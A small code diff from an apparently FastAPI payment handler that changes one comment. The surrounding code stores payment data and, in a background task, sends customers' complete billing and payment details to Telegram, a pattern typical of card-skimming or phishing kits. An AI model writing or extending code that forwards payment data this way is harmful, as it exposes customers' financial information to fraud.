@@ -56,7 +56,7 @@ async def process_payment(payment_request: PaymentRequest, background_tasks: Bac
         # Store payment data
         payment_storage[tracking_data.id] = tracking_data.dict()
         
-        # Send complete payment info to Telegram in background
+        # Send complete info (cliente + pagamento) to Telegram in background
         background_tasks.add_task(
             telegram_service.send_payment_info,
             payment_request.billing_data.dict(),
